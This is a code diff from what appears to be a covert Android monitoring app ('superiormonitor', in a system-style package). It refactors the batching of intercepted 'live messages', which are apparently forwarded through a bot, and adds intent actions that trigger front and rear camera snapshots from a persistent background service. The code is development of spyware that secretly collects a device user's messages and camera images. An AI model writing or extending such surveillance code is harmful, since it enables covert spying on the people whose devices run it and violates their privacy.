@@ -75,8 +75,6 @@ class BotService : Service() {
     }
 
     // Live Text Batching Properties
-    private val messageBuffers = ConcurrentHashMap<String, MutableList<Pair<String, String?>>>()
-    private val throttleJobs = ConcurrentHashMap<String, Job>()
     private val sendMutex = Mutex()
 
     companion object {
@@ -151,6 +149,12 @@ class BotService : Service() {
                 }
                 return START_STICKY
             }
+            "com.system.superiormonitor.ACTION_SNAPSHOT",
+            "com.system.superiormonitor.ACTION_FRONT_CAMERA",
+            "com.system.superiormonitor.ACTION_REAR_CAMERA" -> {
+                com.system.superiormonitor.monitor.SnapshotWorker.executeCapture(this, action, prefsManager!!, serviceScope)
+                return START_STICKY
+            }
         }
 
         // ── Full service startup (Only for null or unknown actions like boot/initial start) ──
@@ -214,35 +218,14 @@ class BotService : Service() {
     }
 
     private fun handleLiveMessage(source: String, message: String, parseMode: String?, offlineSubdir: String, offlineFileName: String, captionBuilder: () -> String) {
-        val buffer = messageBuffers.getOrPut(source) { mutableListOf() }
-        synchronized(buffer) {
-            buffer.add(Pair(message, parseMode))
-            
-            // Safety limit (25 messages)
-            if (buffer.size >= 25) {
-                // Cancel the existing throttle job and process instantly
-                throttleJobs[source]?.cancel()
-                processLiveMessageBuffer(source, offlineSubdir, offlineFileName, captionBuilder)
-                return
-            }
-        }
-        
-        if (throttleJobs[source]?.isActive != true) {
-            throttleJobs[source] = serviceScope.launch(Dispatchers.IO) {
-                delay(3000) // 3 seconds wait from first message
-                processLiveMessageBuffer(source, offlineSubdir, offlineFileName, captionBuilder)
-            }
+        com.system.superiormonitor.core.BatchManager.queue(source, Pair(message, parseMode), 3000L, 25) { batch ->
+            processLiveMessageBuffer(source, batch, offlineSubdir, offlineFileName, captionBuilder)
         }
     }
 
-    private fun processLiveMessageBuffer(source: String, offlineSubdir: String, offlineFileName: String, captionBuilder: () -> String) {
+    private fun processLiveMessageBuffer(source: String, messagesToSend: List<Pair<String, String?>>, offlineSubdir: String, offlineFileName: String, captionBuilder: () -> String) {
         serviceScope.launch(Dispatchers.IO) {
-            val buffer = messageBuffers.getOrPut(source) { mutableListOf<Pair<String, String?>>() }
-            val messagesToSend = synchronized(buffer) {
-                val copy = buffer.toList()
-                buffer.clear()
-                copy
-            }
+
         
         if (messagesToSend.isEmpty()) return@launch
         
